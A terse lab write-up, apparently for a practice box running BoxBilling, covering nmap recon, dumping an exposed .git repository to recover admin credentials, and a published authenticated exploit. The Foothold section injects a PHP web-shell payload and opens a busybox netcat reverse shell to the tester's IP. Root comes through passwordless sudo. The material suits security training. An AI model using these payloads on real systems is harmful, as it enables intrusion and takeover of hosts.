# Table of Contents
- [Recon](#recon)
    - [nmap](#nmap)
- [Foothold](#foothold)
    - [Ports](#ports)
        - [80](#80)
- [PE](#pe)

# Recon

## nmap
```c
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)  
|_ 256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)  
80/tcp open http Apache httpd 2.4.52 ((Ubuntu))  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
|_http-title: Client Area  
| http-robots.txt: 8 disallowed entries  
| /boxbilling/bb-data/ /bb-data/ /bb-library/  
|_/bb-locale/ /bb-modules/ /bb-uploads/ /bb-vendor/ /install/  
| http-git:  
| 192.168.167.27:80/.git/  
| Git repository found!  
| Repository description: Unnamed repository; edit this file 'description' to name the...  
|_ Last commit message: Ready For launch  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Aggressive OS guesses: Cisco Unified Communications Manager VoIP adapter (96%), Linux 2.6.26 (PCLinuxOS) (96%), Linux 2.6.18 (90%), Dell DR4100 backup appliance (88%), Dish Network Hopper media device (88%), Android 7.1.2 (Linux 3.10) (88%), DD-WRT v23 (Linux 2.4.36) (88%), Cisco SA520 firewall (Linux 2.6) (88%), Linux 2.6.11 (88%), Vyatta router (Linux 2.6.26) (88%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 4 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Foothold
## Ports
#### 80
<pre>
Apache
Box billing landing page
    Found known exploit that gives RCE, requires admin:  https://www.exploit-db.com/exploits/51108
    /robots.txt  >  multiple disallowed pages. Found admin email:  admin@bullybox.local
    /.git  >  forbidden
        git-dumper http://bullybox.local/.git ~/git
        cat * | grep admin  >  Found admin login page  /bb-admin
        cat * | grep password  >  Found password "Playing-Unstylish7-Provided"
/bb-admin
    Credentials: admin@bullybox.local:Playing-Unstylish7-Provided
    Follow the known exploit and capture with burp. Cahnge payload to:  &path=axs.php&data=<?=`$_GET[0]`?>
    Navigate to /axs.php?0=id   >  we have command execution
    To get RCE
        nc -lvnp 80
        /axs.php?0=busybox nc 192.168.45.151 80 -e /bin/bash
</pre>

# PE
<pre>
ID
    uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
sudo -l
    (ALL : ALL) ALL  
    (ALL) NOPASSWD: ALL

sudo su  >  now we are rooted


</pre>